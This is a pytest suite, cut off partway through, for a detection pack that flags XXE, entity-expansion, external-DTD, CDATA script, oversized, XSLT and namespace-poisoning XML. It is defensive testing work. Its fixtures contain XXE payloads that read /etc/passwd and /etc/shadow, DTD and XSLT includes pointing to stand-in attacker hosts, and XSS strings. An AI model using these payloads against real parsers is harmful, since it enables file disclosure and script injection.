# test_xml_security_pack.py
# ---------------------------------------------------------------------------
# Creative Commons Attribution 4.0 International (CC BY 4.0)
# https://creativecommons.org/licenses/by/4.0/
# Copyright (c) 2026 Cyber Port — hiagokinlevi
# ---------------------------------------------------------------------------
"""
Test suite for XMLSecurityPack.

Covers all seven checks (XML-001 through XML-007), boundary conditions,
blocked/allowed logic, risk_score computation, helper methods, dataclass
serialisation, and constructor parameters.

Run with:
    python3 -m pytest tests/test_xml_security_pack.py --override-ini="addopts=" -q
"""
from __future__ import annotations

import sys
import os

# Ensure project root is on the path so shared/ is importable
sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

import pytest
from shared.rulepacks.xml_security_pack import (
    XMLEvalResult,
    XMLFinding,
    XMLRequest,
    XMLSecurityPack,
    _CHECK_WEIGHTS,
)


# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------

@pytest.fixture()
def pack() -> XMLSecurityPack:
    """Default pack with stock configuration (512 KB, block on HIGH)."""
    return XMLSecurityPack()


@pytest.fixture()
def clean_xml() -> XMLRequest:
    """A simple, safe XML document that should produce zero findings."""
    return XMLRequest(
        content="<?xml version='1.0' encoding='UTF-8'?><root><item>hello</item></root>",
        source_ip="10.0.0.1",
        endpoint="/api/data",
    )


# ===========================================================================
# 1. Clean XML — no findings
# ===========================================================================

class TestCleanXML:
    def test_clean_produces_no_findings(self, pack, clean_xml):
        result = pack.evaluate(clean_xml)
        assert result.findings == []

    def test_clean_risk_score_is_zero(self, pack, clean_xml):
        result = pack.evaluate(clean_xml)
        assert result.risk_score == 0

    def test_clean_not_blocked(self, pack, clean_xml):
        result = pack.evaluate(clean_xml)
        assert result.blocked is False

    def test_clean_summary_contains_allowed(self, pack, clean_xml):
        result = pack.evaluate(clean_xml)
        assert "ALLOWED" in result.summary()

    def test_plain_element_tree_no_findings(self, pack):
        """Well-formed XML with attributes and nested elements is clean."""
        content = (
            '<catalog xmlns="urn:example">'
            '<book id="1"><title>Safe Book</title></book>'
            '</catalog>'
        )
        result = pack.evaluate(XMLRequest(content=content))
        assert result.findings == []

    def test_xml_with_safe_w3c_namespace_no_findings(self, pack):
        """W3C namespace URIs are explicitly allow-listed and must not fire."""
        content = (
            '<root xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">'
            '<item/>'
            '</root>'
        )
        result = pack.evaluate(XMLRequest(content=content))
        assert result.findings == []


# ===========================================================================
# 2. XML-001 — XXE via DOCTYPE ENTITY
# ===========================================================================

class TestXML001XXE:

    # ---- DOCTYPE with internal subset + ENTITY triggers -------------------

    def test_001_internal_subset_and_entity_triggers(self, pack):
        content = (
            '<?xml version="1.0"?>'
            '<!DOCTYPE foo ['
            '  <!ENTITY xxe "injected">'
            ']>'
            '<root>&xxe;</root>'
        )
        result = pack.evaluate(XMLRequest(content=content))
        ids = [f.check_id for f in result.findings]
        assert "XML-001" in ids

    def test_001_internal_subset_without_entity_does_not_trigger(self, pack):
        """DOCTYPE with an internal subset but no ENTITY should not fire XML-001."""
        content = (
            '<?xml version="1.0"?>'
            '<!DOCTYPE foo ['
            '  <!ELEMENT foo ANY>'
            ']>'
            '<foo/>'
        )
        result = pack.evaluate(XMLRequest(content=content))
        ids = [f.check_id for f in result.findings]
        assert "XML-001" not in ids

    # ---- SYSTEM entity reference triggers ---------------------------------

    def test_001_system_entity_triggers(self, pack):
        content = (
            '<?xml version="1.0"?>'
            '<!DOCTYPE foo SYSTEM "http://evil.example.com/evil.dtd">'
            '<foo/>'
        )
        result = pack.evaluate(XMLRequest(content=content))
        ids = [f.check_id for f in result.findings]
        assert "XML-001" in ids

    def test_001_system_entity_severity_is_critical(self, pack):
        content = (
            '<!DOCTYPE root SYSTEM "file:///etc/passwd">'
            '<root/>'
        )
        result = pack.evaluate(XMLRequest(content=content))
        xxe_findings = [f for f in result.findings if f.check_id == "XML-001"]
        assert xxe_findings
        assert xxe_findings[0].severity == "CRITICAL"

    # ---- PUBLIC entity reference triggers ---------------------------------

    def test_001_public_entity_triggers(self, pack):
        content = (
            '<?xml version="1.0"?>'
            '<!DOCTYPE foo PUBLIC "-//W3C//DTD XHTML 1.0//EN"'
            ' "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">'
            '<html/>'
        )
        result = pack.evaluate(XMLRequest(content=content))
        ids = [f.check_id for f in result.findings]
        assert "XML-001" in ids

    def test_001_public_entity_severity_is_critical(self, pack):
        content = (
            '<!DOCTYPE html PUBLIC "-//ATTACKER//DTD" "http://evil.com/dtd">'
            '<html/>'
        )
        result = pack.evaluate(XMLRequest(content=content))
        xxe = [f for f in result.findings if f.check_id == "XML-001"]
        assert xxe
        assert xxe[0].severity == "CRITICAL"

    # ---- Plain XML without DOCTYPE does not trigger -----------------------

    def test_001_plain_xml_no_doctype_does_not_trigger(self, pack):
        content = '<root><child attr="value">text</child></root>'
        result = pack.evaluate(XMLRequest(content=content))
        ids = [f.check_id for f in result.findings]
        assert "XML-001" not in ids

    def test_001_entity_decl_without_doctype_does_not_trigger(self, pack):
        """
        An ENTITY keyword appearing in a comment or text without a proper
        DOCTYPE internal subset should not trigger XML-001 (condition A).
        """
        # This content has <!ENTITY but no <!DOCTYPE ... [
        content = (
            '<!-- <!ENTITY commented out> -->'
            '<root/>'
        )
        result = pack.evaluate(XMLRequest(content=content))
        # XML-001 condition A requires both DOCTYPE internal subset AND ENTITY
        # XML-001 conditions B/C require DOCTYPE SYSTEM/PUBLIC — neither present
        ids = [f.check_id for f in result.findings]
        assert "XML-001" not in ids

    # ---- Evidence is capped at 100 characters ----------------------------

    def test_001_evidence_max_100_chars(self, pack):
        content = (
            '<!DOCTYPE '
            + 'a' * 200
            + ' SYSTEM "file:///etc/passwd">'
            '<root/>'
        )
        result = pack.evaluate(XMLRequest(content=content))
        xxe = [f for f in result.findings if f.check_id == "XML-001"]
        assert xxe
        assert len(xxe[0].evidence) <= 100


# ===========================================================================
# 3. XML-002 — XML bomb / entity expansion
# ===========================================================================

class TestXML002XMLBomb:

    def _make_entities(self, count: int) -> str:
        """Build a DOCTYPE internal subset with `count` ENTITY declarations."""
        entities = "".join(
            f'<!ENTITY e{i} "value{i}">' for i in range(count)
        )
        return f'<!DOCTYPE root [{entities}]><root/>'

    # ---- Six or more ENTITY declarations triggers -------------------------

    def test_002_six_entities_triggers(self, pack):
        content = self._make_entities(6)
        result = pack.evaluate(XMLRequest(content=content))
        ids = [f.check_id for f in result.findings]
        assert "XML-002" in ids

    def test_002_ten_entities_triggers(self, pack):
        content = self._make_entities(10)
        result = pack.evaluate(XMLRequest(content=content))
        ids = [f.check_id for f in result.findings]
        assert "XML-002" in ids

    def test_002_entity_count_severity_is_high(self, pack):
        content = self._make_entities(7)
        result = pack.evaluate(XMLRequest(content=content))
        bomb = [f for f in result.findings if f.check_id == "XML-002"]
        assert bomb
        assert bomb[0].severity == "HIGH"

    # ---- Five or fewer ENTITY declarations does NOT trigger ---------------

    def test_002_five_entities_does_not_trigger(self, pack):
        content = self._make_entities(5)
        result = pack.evaluate(XMLRequest(content=content))
        ids = [f.check_id for f in result.findings]
        assert "XML-002" not in ids

    def test_002_one_entity_does_not_trigger(self, pack):
        content = self._make_entities(1)
        result = pack.evaluate(XMLRequest(content=content))
        ids = [f.check_id for f in result.findings]
        assert "XML-002" not in ids

    def test_002_zero_entities_does_not_trigger(self, pack):
        content = '<root><child/></root>'
        result = pack.evaluate(XMLRequest(content=content))
        ids = [f.check_id for f in result.findings]
        assert "XML-002" not in ids

    # ---- Nested entity reference triggers ---------------------------------

    def test_002_nested_entity_double_quote_triggers(self, pack):
        """Entity value contains &other_entity; — nested expansion."""
        content = (
            '<!DOCTYPE root ['
            '  <!ENTITY base "hello">'
            '  <!ENTITY nested "&base; world">'
            ']>'
            '<root>&nested;</root>'
        )
        result = pack.evaluate(XMLRequest(content=content))
        ids = [f.check_id for f in result.findings]
        assert "XML-002" in ids

    def test_002_nested_entity_single_quote_triggers(self, pack):
        """Single-quoted entity value containing &other; also triggers."""
        content = (
            "<!DOCTYPE root ["
            "  <!ENTITY a 'foo'>"
            "  <!ENTITY b '&a; bar'>"
            "]>"
            "<root>&b;</root>"
        )
        result = pack.evaluate(XMLRequest(content=content))
        ids = [f.check_id for f in result.findings]
        assert "XML-002" in ids

    def test_002_entity_value_without_nesting_does_not_trigger_nested_rule(
        self, pack
    ):
        """Three entity declarations whose values do not reference other entities."""
        content = (
            '<!DOCTYPE root ['
            '  <!ENTITY a "one">'
            '  <!ENTITY b "two">'
            '  <!ENTITY c "three">'
            ']>'
            '<root>&a;&b;&c;</root>'
        )
        result = pack.evaluate(XMLRequest(content=content))
        ids = [f.check_id for f in result.findings]
        # Only 3 entities, no nesting — XML-002 must NOT fire
        assert "XML-002" not in ids


# ===========================================================================
# 4. XML-003 — DTD external resource reference
# ===========================================================================

class TestXML003DTDExternal:

    def test_003_system_file_scheme_triggers(self, pack):
        content = (
            '<!DOCTYPE root ['
            '  <!ENTITY ext SYSTEM "file:///etc/passwd">'
            ']><root>&ext;</root>'
        )
        result = pack.evaluate(XMLRequest(content=content))
        ids = [f.check_id for f in result.findings]
        assert "XML-003" in ids

    def test_003_system_http_scheme_triggers(self, pack):
        content = (
            '<!DOCTYPE root ['
            '  <!ENTITY remote SYSTEM "http://attacker.com/data">'
            ']><root/>'
        )
        result = pack.evaluate(XMLRequest(content=content))
        ids = [f.check_id for f in result.findings]
        assert "XML-003" in ids

    def test_003_system_https_scheme_triggers(self, pack):
        content = (
            '<!DOCTYPE root ['
            '  <!ENTITY s SYSTEM "https://evil.example.com/payload">'
            ']><root/>'
        )
        result = pack.evaluate(XMLRequest(content=content))
        ids = [f.check_id for f in result.findings]
        assert "XML-003" in ids

    def test_003_system_ftp_scheme_triggers(self, pack):
        content = (
            '<!DOCTYPE root ['
            '  <!ENTITY ftp SYSTEM "ftp://evil.example.com/file">'
            ']><root/>'
        )
        result = pack.evaluate(XMLRequest(content=content))
        ids = [f.check_id for f in result.findings]
        assert "XML-003" in ids

    def test_003_named_system_entity_without_known_scheme_triggers(self, pack):
        """<!ENTITY name SYSTEM ...> without an explicit scheme still triggers."""
        content = (
            '<!DOCTYPE root ['
            '  <!ENTITY ext SYSTEM "//relative-external">'
            ']><root/>'
        )
        result = pack.evaluate(XMLRequest(content=content))
        ids = [f.check_id for f in result.findings]
        assert "XML-003" in ids

    def test_003_severity_is_high(self, pack):
        content = (
            '<!DOCTYPE r [<!ENTITY e SYSTEM "file:///etc/shadow">]><r/>'
        )
        result = pack.evaluate(XMLRequest(content=content))
        dtd = [f for f in result.findings if f.check_id == "XML-003"]
        assert dtd
        assert dtd[0].severity == "HIGH"

    def test_003_no_system_reference_does_not_trigger(self, pack):
        content = '<root><child>safe content here</child></root>'
        result = pack.evaluate(XMLRequest(content=content))
        ids = [f.check_id for f in result.findings]
        assert "XML-003" not in ids

    def test_003_internal_entity_without_system_does_not_trigger(self, pack):
        """An inline ENTITY value without SYSTEM keyword must not fire XML-003."""
        content = (
            '<!DOCTYPE root ['
            '  <!ENTITY greeting "Hello World">'
            ']>'
            '<root>&greeting;</root>'
        )
        result = pack.evaluate(XMLRequest(content=content))
        ids = [f.check_id for f in result.findings]
        assert "XML-003" not in ids


# ===========================================================================
# 5. XML-004 — CDATA script injection
# ===========================================================================

class TestXML004CDATAScript:

    def test_004_cdata_with_script_tag_triggers(self, pack):
        content = '<root><![CDATA[<script>alert(1)</script>]]></root>'
        result = pack.evaluate(XMLRequest(content=content))
        ids = [f.check_id for f in result.findings]
        assert "XML-004" in ids

    def test_004_cdata_with_javascript_protocol_triggers(self, pack):
        content = '<root><![CDATA[javascript:void(0)]]></root>'
        result = pack.evaluate(XMLRequest(content=content))
        ids = [f.check_id for f in result.findings]
        assert "XML-004" in ids

    def test_004_cdata_with_document_dot_triggers(self, pack):
        content = '<root><![CDATA[document.cookie = "stolen"]]></root>'
        result = pack.evaluate(XMLRequest(content=content))
        ids = [f.check_id for f in result.findings]
        assert "XML-004" in ids

    def test_004_cdata_with_eval_triggers(self, pack):
        content = '<root><![CDATA[eval(atob("cGF5bG9hZA=="))]]></root>'
        result = pack.evaluate(XMLRequest(content=content))
        ids = [f.check_id for f in result.findings]
        assert "XML-004" in ids

    def test_004_cdata_with_onload_triggers(self, pack):
        content = '<root><![CDATA[<img src=x onload=alert(1)>]]></root>'
        result = pack.evaluate(XMLRequest(content=content))
        ids = [f.check_id for f in result.findings]
        assert "XML-004" in ids

    def test_004_cdata_with_multiline_script_triggers(self, pack):
        """Script keyword split across lines inside CDATA must still fire."""
        content = '<root><![CDATA[\n<script\ntype="text/javascript">alert(1)</script>\n]]></root>'
        result = pack.evaluate(XMLRequest(content=content))
        ids = [f.check_id for f in result.findings]
        assert "XML-004" in ids

    def test_004_cdata_severity_is_medium(self, pack):
        content = '<root><![CDATA[<script>x()</script>]]></root>'
        result = pack.evaluate(XMLRequest(content=content))
        cdata = [f for f in result.findings if f.check_id == "XML-004"]
        assert cdata
        assert cdata[0].severity == "MEDIUM"

    def test_004_cdata_without_script_does_not_trigger(self, pack):
        # Deliberately avoid the substring "script" so the regex cannot match
        content = '<root><![CDATA[safe text with no dangerous payload here]]></root>'
        result = pack.evaluate(XMLRequest(content=content))
        ids = [f.check_id for f in result.findings]
        assert "XML-004" not in ids

    def test_004_no_cdata_section_does_not_trigger(self, pack):
        content = '<root><child>plain text no cdata</child></root>'
        result = pack.evaluate(XMLRequest(content=content))
        ids = [f.check_id for f in result.findings]
        assert "XML-004" not in ids

    def test_004_script_outside_cdata_does_not_trigger_004(self, pack):
        """The 'script' keyword in regular text outside CDATA must not fire XML-004."""
        content = '<root><description>this talks about script tags</description></root>'
        result = pack.evaluate(XMLRequest(content=content))
        ids = [f.check_id for f in result.findings]
        assert "XML-004" not in ids


# ===========================================================================
# 6. XML-005 — Oversized payload
# ===========================================================================

class TestXML005Oversized:

    def test_005_payload_over_limit_triggers(self, pack):
        # Default limit = 512 KB; create content just over 512 KB
        padding = "A" * (512 * 1024 + 1)
        content = f'<root>{padding}</root>'
        result = pack.evaluate(XMLRequest(content=content))
        ids = [f.check_id for f in result.findings]
        assert "XML-005" in ids

    def test_005_payload_exactly_at_limit_does_not_trigger(self, pack):
        """Exactly at the byte limit must NOT fire — limit is exclusive."""
        limit_bytes = 512 * 1024
        # Build content whose UTF-8 encoding is exactly limit_bytes
        wrapper = b'<r></r>'
        # Fill with ASCII so 1 char == 1 byte
        padding_len = limit_bytes - len(wrapper)
        content = '<r>' + 'A' * padding_len + '</r>'
        assert len(content.encode("utf-8")) == limit_bytes
        result = pack.evaluate(XMLRequest(content=content))
        ids = [f.check_id for f in result.findings]
        assert "XML-005" not in ids

    def test_005_payload_one_byte_over_limit_triggers(self, pack):
        limit_bytes = 512 * 1024
        wrapper = b'<r></r>'
        padding_len = limit_bytes - len(wrapper) + 1
        content = '<r>' + 'A' * padding_len + '</r>'
        assert len(content.encode("utf-8")) == limit_bytes + 1
        result = pack.evaluate(XMLRequest(content=content))
        ids = [f.check_id for f in result.findings]
        assert "XML-005" in ids

    def test_005_severity_is_high(self, pack):
        content = '<r>' + 'X' * (513 * 1024) + '</r>'
        result = pack.evaluate(XMLRequest(content=content))
        over = [f for f in result.findings if f.check_id == "XML-005"]
        assert over
        assert over[0].severity == "HIGH"

    def test_005_custom_max_payload_kb_respected(self):
        """A pack with max_payload_kb=1 should fire on a 2 KB payload."""
        small_pack = XMLSecurityPack(max_payload_kb=1)
        content = '<r>' + 'B' * (2 * 1024) + '</r>'
        result = small_pack.evaluate(XMLRequest(content=content))
        ids = [f.check_id for f in result.findings]
        assert "XML-005" in ids

    def test_005_small_payload_under_custom_limit_does_not_trigger(self):
        small_pack = XMLSecurityPack(max_payload_kb=10)
        content = '<r>tiny</r>'
        result = small_pack.evaluate(XMLRequest(content=content))
        ids = [f.check_id for f in result.findings]
        assert "XML-005" not in ids

    def test_005_evidence_max_100_chars(self, pack):
        content = '<r>' + 'Z' * (600 * 1024) + '</r>'
        result = pack.evaluate(XMLRequest(content=content))
        over = [f for f in result.findings if f.check_id == "XML-005"]
        assert over
        assert len(over[0].evidence) <= 100


# ===========================================================================
# 7. XML-006 — XSLT injection
# ===========================================================================

class TestXML006XSLT:

    def test_006_xsl_value_of_triggers(self, pack):
        content = (
            '<?xml version="1.0"?>'
            '<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform">'
            '<xsl:template match="/">'
            '<xsl:value-of select="system-property(\'xsl:vendor\')"/>'
            '</xsl:template>'
            '</xsl:stylesheet>'
        )
        result = pack.evaluate(XMLRequest(content=content))
        ids = [f.check_id for f in result.findings]
        assert "XML-006" in ids

    def test_006_xsl_for_each_triggers(self, pack):
        content = (
            '<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform">'
            '<xsl:template match="/">'
            '<xsl:for-each select="//item"><xsl:value-of select="."/></xsl:for-each>'
            '</xsl:template>'
            '</xsl:stylesheet>'
        )
        result = pack.evaluate(XMLRequest(content=content))
        ids = [f.check_id for f in result.findings]
        assert "XML-006" in ids

    def test_006_xsl_include_triggers(self, pack):
        content = (
            '<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform">'
            '<xsl:include href="http://evil.com/payload.xsl"/>'
            '</xsl:stylesheet>'
        )
        result = pack.evaluate(XMLRequest(content=content))
        ids = [f.check_id for f in result.findings]
        assert "XML-006" in ids

    def test_006_xsl_import_triggers(self, pack):
        content = (
            '<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform">'
            '<xsl:import href="http://attacker.com/inject.xsl"/>'
            '</xsl:stylesheet>'
        )
        result = pack.evaluate(XMLRequest(content=content))
        ids = [f.check_id for f in result.findings]
        assert "XML-006" in ids

    def test_006_severity_is_high(self, pack):
        content = '<xsl:include href="http://evil.com/x.xsl"/>'
        result = pack.evaluate(XMLRequest(content=content))
        xslt = [f for f in result.findings if f.check_id == "XML-006"]
        assert xslt
        assert xslt[0].severity == "HIGH"

    def test_006_no_xsl_namespace_does_not_trigger(self, pack):
        content = '<root><element>no xslt directives here</element></root>'
        result = pack.evaluate(XMLRequest(content=content))
        ids = [f.check_id for f in result.findings]
        assert "XML-006" not in ids

    def test_006_xsl_element_in_comment_does_not_trigger(self, pack):
        """
        The pattern requires the literal ``<xsl:`` tag prefix.  The substring
        ``xsl:value-of`` appearing in comment text without the opening ``<``
        does NOT match and should not fire XML-006.
        """
        content = '<!-- attacker tries xsl:value-of select="/" --><root/>'
        result = pack.evaluate(XMLRequest(content=content))
        ids = [f.check_id for f in result.findings]
        assert "XML-006" not in ids

    def test_006_xsl_tag_in_xml_content_triggers(self, pack):
        """
        When the actual ``<xsl:value-of`` element tag appears in the content,
        even outside a proper stylesheet context, the pattern fires.
        """
        content = 'some preamble <xsl:value-of select="//secret"/> rest'
        result = pack.evaluate(XMLRequest(content=content))
        ids = [f.check_id for f in result.findings]
        assert "XML-006" in ids

    def test_006_case_insensitive_match(self, pack):
        """XSL tags in mixed case should still be detected."""
        content = '<XSL:VALUE-OF select="doc(\'file:///etc/passwd\')"/>'
        result = pack.evaluate(XMLRequest(content=content))
        ids = [f.check_id for f in result.findings]
        assert "XML-006" in ids


# ===========================================================================
# 8. XML-007 — Namespace poisoning
# ===========================================================================

class TestXML007NamespacePoison:

    def test_007_file_scheme_namespace_triggers(self, pack):
        content = (
            '<root xmlns:evil="file:///etc/passwd">'
            '<child/>'
            '</root>'
        )
        result = pack.evaluate(XMLRequest(content=content))
        ids = [f.check_id for f in result.findings]
        assert "XML-007" in ids

    def test_007_http_non_safe_namespace_triggers(self, pack):
        content = (
            '<root xmlns:attacker="http://example.com/evil-namespace">'
            '<child/>'
            '</root>'
        )
        result = pack.evaluate(XMLRequest(content=content))
        ids = [f.check_id for f in result.findings]
        assert "XML-007" in ids

    def test_007_https_non_safe_namespace_triggers(self, pack):
        content = (
            '<root xmlns:bad="https://attacker.io/namespace">'
            '<child/>'
            '</root>'
        )
        result = pack.evaluate(XMLRequest(content=content))
        ids = [f.check_id for f in result.findings]
        assert "XML-007" in ids

    def test_007_severity_is_medium(self, pack):
        content = '<root xmlns:x="http://example.com/ns"><child/></root>'
        result = pack.evaluate(XMLRequest(content=content))
        ns = [f for f in result.findings if f.check_id == "XML-007"]
        assert ns
        assert ns[0].severity == "MEDIUM"

    # ---- Safe namespaces must NOT trigger ---------------------------------

    def test_007_w3c_namespace_does_not_trigger(self, pack):
        content = (
            '<root xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">'
            '<child/>'
            '</root>'
        )
        result = pack.evaluate(XMLRequest(content=content))
        ids = [f.check_id for f in result.findings]
        assert "XML-007" not in ids

    def test_007_xmlsoap_namespace_does_not_trigger(self, pack):
        content = (
            '<soap:Envelope '
            'xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">'
            '<soap:Body/>'
            '</soap:Envelope>'
        )
        result = pack.evaluate(XMLRequest(content=content))
        ids = [f.check_id for f in result.findings]
        assert "XML-007" not in ids

    def test_007_urn_namespace_does_not_trigger(self, pack):
        content = (
            '<root xmlns:ex="urn:example:schema">'
            '<child/>'
            '</root>'
        )
        result = pack.evaluate(XMLRequest(content=content))
        ids = [f.check_id for f in result.findings]
        assert "XML-007" not in ids

    def test_007_purl_namespace_does_not_trigger(self, pack):
        content = (
            '<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"'
            '         xmlns:dc="http://purl.org/dc/elements/1.1/">'
            '<rdf:Description/>'
            '</rdf:RDF>'
        )
        result = pack.evaluate(XMLRequest(content=content))
        ids = [f.check_id for f in result.findings]
        assert "XML-007" not in ids

    def test_007_openformats_namespace_does_not_trigger(self, pack):
        content = (
            '<root xmlns:of="http://www.openformats.org/ns/open-document-format">'
            '<item/>'
            '</root>'
        )
        result = pack.evaluate(XMLRequest(content=content))
        ids = [f.check_id for f in result.findings]
        assert "XML-007" not in ids

    def test_007_bare_urn_token_namespace_does_not_trigger(self, pack):
        """Non-URI namespace values (bare tokens) are not flagged."""
        content = '<root xmlns:local="localNamespace"><item/></root>'
        result = pack.evaluate(XMLRequest(content=content))
        ids = [f.check_id for f in result.findings]
        assert "XML-007" not in ids


# ===========================================================================
# 9. Blocked / allowed logic
# ===========================================================================

class TestBlockedLogic:

    def test_critical_finding_blocks_when_threshold_is_high(self, pack):
        """A CRITICAL finding (XML-001) must set blocked=True when threshold=HIGH."""
        content = (
            '<!DOCTYPE foo SYSTEM "file:///etc/passwd"><foo/>'
        )
        result = pack.evaluate(XMLRequest(content=content))
        assert result.blocked is True

    def test_high_finding_blocks_when_threshold_is_high(self, pack):
        """A HIGH finding (XML-006 xsl:include) must set blocked=True."""
        content = '<xsl:include href="http://evil.com/x.xsl"/>'
        result = pack.evaluate(XMLRequest(content=content))
        assert result.blocked is True

    def test_medium_finding_does_not_block_when_threshold_is_high(self, pack):
        """XML-004 is MEDIUM; default threshold is HIGH so blocked must be False."""
        content = '<root><![CDATA[<script>alert(1)</script>]]></root>'
        result = pack.evaluate(XMLRequest(content=content))
        # Verify XML-004 fired
        assert any(f.check_id == "XML-004" for f in result.findings)
        # No HIGH/CRITICAL findings in a plain CDATA script payload
        high_or_critical = [
            f for f in result.findings
            if f.severity in ("HIGH", "CRITICAL")
        ]
        if not high_or_critical:
            assert result.blocked is False

    def test_medium_finding_blocks_when_threshold_is_medium(self):
        """With block_on_severity=MEDIUM, a MEDIUM finding must set blocked=True."""
        sensitive_pack = XMLSecurityPack(block_on_severity="MEDIUM")
        content = '<root><![CDATA[<script>alert(1)</script>]]></root>'
        result = sensitive_pack.evaluate(XMLRequest(content=content))
        # XML-004 is MEDIUM; threshold is MEDIUM => blocked must be True
        if any(f.check_id == "XML-004" for f in result.findings):
            assert result.blocked is True

    def test_no_findings_not_blocked(self, pack):
        result = pack.evaluate(XMLRequest(content='<safe/>'))
        assert result.blocked is False

    def test_blocked_flag_reflected_in_summary(self):
        blocked_pack = XMLSecurityPack(block_on_severity="LOW")
        content = (
            '<!DOCTYPE foo SYSTEM "file:///etc/passwd"><foo/>'
        )
        result = blocked_pack.evaluate(XMLRequest(content=content))
        assert result.blocked is True
        assert "BLOCKED" in result.summary()

    def test_allowed_flag_reflected_in_summary(self, pack):
        result = pack.evaluate(XMLRequest(content='<clean/>'))
        assert "ALLOWED" in result.summary()


# ===========================================================================
# 10. Risk score computation and cap
# ===========================================================================

class TestRiskScore:

    def test_risk_score_zero_for_clean(self, pack):
        result = pack.evaluate(XMLRequest(content='<clean/>'))
        assert result.risk_score == 0

    def test_risk_score_equals_weight_for_single_finding(self):
        """XML-005 alone contributes weight 20."""
        pack = XMLSecurityPack(max_payload_kb=1)
        content = '<r>' + 'B' * (2 * 1024) + '</r>'
        result = pack.evaluate(XMLRequest(content=content))
        xml005 = [f for f in result.findings if f.check_id == "XML-005"]
        if xml005 and len(result.findings) == 1:
            assert result.risk_score == _CHECK_WEIGHTS["XML-005"]

    def test_risk_score_sums_multiple_unique_findings(self, pack):
        """
        A document triggering XML-001 (45) + XML-003 (30) must have
        risk_score = min(100, 45 + 30) = 75 at minimum — other checks may
        also fire raising the score further.
        """
        content = (
            '<!DOCTYPE root SYSTEM "file:///etc/passwd">'
            '<root/>'
        )
        result = pack.evaluate(XMLRequest(content=content))
        fired_ids = {f.check_id for f in result.findings}
        expected = min(100, sum(_CHECK_WEIGHTS.get(c, 0) for c in fired_ids))
        assert result.risk_score == expected

    def test_risk_score_capped_at_100(self):
        """Stacking multiple heavy checks must cap at 100."""
        # Force XML-001 (45) + XML-002 (30) + XML-003 (30) + XML-005 (20)
        # = 125 -> capped at 100
        tiny_pack = XMLSecurityPack(max_payload_kb=1)
        # 6 entities triggers XML-002, DOCTYPE SYSTEM triggers XML-001 and XML-003,
        # large payload triggers XML-005
        entities = "".join(f'<!ENTITY e{i} "v">' for i in range(6))
        padding = 'A' * (2 * 1024)
        content = (
            f'<!DOCTYPE root SYSTEM "http://evil.com/dtd" [{entities}]>'
            f'<root>{padding}</root>'
        )
        result = tiny_pack.evaluate(XMLRequest(content=content))
        assert result.risk_score <= 100

    def test_risk_score_is_integer(self, pack):
        content = '<xsl:include href="http://evil.com/x.xsl"/>'
        result = pack.evaluate(XMLRequest(content=content))
        assert isinstance(result.risk_score, int)

    def test_risk_score_non_negative(self, pack):
        result = pack.evaluate(XMLRequest(content='<safe/>'))
        assert result.risk_score >= 0

    def test_check_weights_dict_has_all_seven_ids(self):
        expected_ids = {
            "XML-001", "XML-002", "XML-003", "XML-004",
            "XML-005", "XML-006", "XML-007",
        }
        assert expected_ids == set(_CHECK_WEIGHTS.keys())

    def test_all_weights_are_positive_integers(self):
        for check_id, weight in _CHECK_WEIGHTS.items():
            assert isinstance(weight, int), f"{check_id} weight is not int"
            assert weight > 0, f"{check_id} weight must be positive"


# ===========================================================================
# 11. by_severity() structure
# ===========================================================================

class TestBySeverity:

    def test_by_severity_has_all_buckets(self, pack):
        result = pack.evaluate(XMLRequest(content='<safe/>'))
        by_sev = result.by_severity()
        for level in ("CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"):
            assert level in by_sev

    def test_by_severity_all_empty_for_clean(self, pack):
        result = pack.evaluate(XMLRequest(content='<clean/>'))
        by_sev = result.by_severity()
        for level, bucket in by_sev.items():
            assert bucket == [], f"Expected empty bucket for {level}"

    def test_by_severity_places_critical_finding_correctly(self, pack):
        content = '<!DOCTYPE r SYSTEM "file:///etc/passwd"><r/>'
        result = pack.evaluate(XMLRequest(content=content))
        by_sev = result.by_severity()
        critical_ids = [f.check_id for f in by_sev["CRITICAL"]]
        assert "XML-001" in critical_ids

    def test_by_severity_places_medium_finding_correctly(self, pack):
        content = '<root><![CDATA[<script>x()</script>]]></root>'
        result = pack.evaluate(XMLRequest(content=content))
        by_sev = result.by_severity()
        medium_ids = [f.check_id for f in by_sev["MEDIUM"]]
        if any(f.check_id == "XML-004" for f in result.findings):
            assert "XML-004" in medium_ids

    def test_by_severity_returns_lists(self, pack):
        result = pack.evaluate(XMLRequest(content='<safe/>'))
        by_sev = result.by_severity()
        for level, bucket in by_sev.items():
            assert isinstance(bucket, list), f"Bucket for {level} must be a list"


# ===========================================================================
# 12. summary() format
# ===========================================================================

class TestSummary:

    def test_summary_contains_risk_score(self, pack):
        content = '<xsl:include href="http://evil.com/x.xsl"/>'
        result = pack.evaluate(XMLRequest(content=content))
        assert "risk_score=" in result.summary()

    def test_summary_contains_finding_count(self, pack):
        content = '<xsl:import href="http://evil.com/x.xsl"/>'
        result = pack.evaluate(XMLRequest(content=content))
        assert "finding" in result.summary()

    def test_summary_zero_findings_format(self, pack):
        result = pack.evaluate(XMLRequest(content='<safe/>'))
        assert "0 findings" in result.summary()

    def test_summary_lists_check_ids(self, pack):
        content = '<xsl:include href="http://evil.com/x.xsl"/>'
        result = pack.evaluate(XMLRequest(content=content))
        summary = result.summary()
        for finding in result.findings:
            assert finding.check_id in summary

    def test_summary_singular_finding_word(self, pack):
        """When exactly one finding exists the word 'finding' (not 'findings') is used."""
        # Use a pack that is unlikely to co-fire multiple checks
        single_pack = XMLSecurityPack(max_payload_kb=1024)
        # XML-007 alone — non-safe HTTP namespace, no other triggers
        content = '<root xmlns:x="http://example.com/ns"><item/></root>'
        result = single_pack.evaluate(XMLRequest(content=content))
        if len(result.findings) == 1:
            assert "1 finding:" in result.summary()

    def test_summary_returns_string(self, pack):
        result = pack.evaluate(XMLRequest(content='<safe/>'))
        assert isinstance(result.summary(), str)


# ===========================================================================
# 13. evaluate_many()
# ===========================================================================

class TestEvaluateMany:

    def test_evaluate_many_returns_list(self, pack):
        requests = [
            XMLRequest(content='<safe/>'),
